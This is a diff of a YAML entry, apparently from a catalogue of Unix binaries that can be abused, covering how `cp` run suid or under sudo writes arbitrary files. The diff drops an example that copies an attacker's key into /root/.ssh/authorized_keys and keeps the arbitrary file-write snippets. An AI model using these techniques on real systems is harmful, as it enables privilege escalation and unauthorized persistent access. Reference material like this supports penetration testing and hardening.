@@ -12,22 +12,17 @@ functions:
     - code: |
         LFILE=file_to_write
         echo "DATA" | ./cp /dev/stdin "$LFILE"
-    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.
+    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
       code: |
         LFILE=file_to_write
         TF=$(mktemp)
         echo "DATA" > $TF
         ./cp $TF $LFILE
-    - description: This can be used to create directories and copy files into them, in this case copying a key into authorized_keys when the .ssh directory did not exist prior.
-      code: |
-        mkdir .ssh
-        echo "<public_key_here>" > .ssh/authorized_keys
-        cp --parents .ssh/authorized_keys /root
   sudo:
     - code: |
         LFILE=file_to_write
         echo "DATA" | sudo cp /dev/stdin "$LFILE"
-    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.
+    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
       code: |
         LFILE=file_to_write
         TF=$(mktemp)
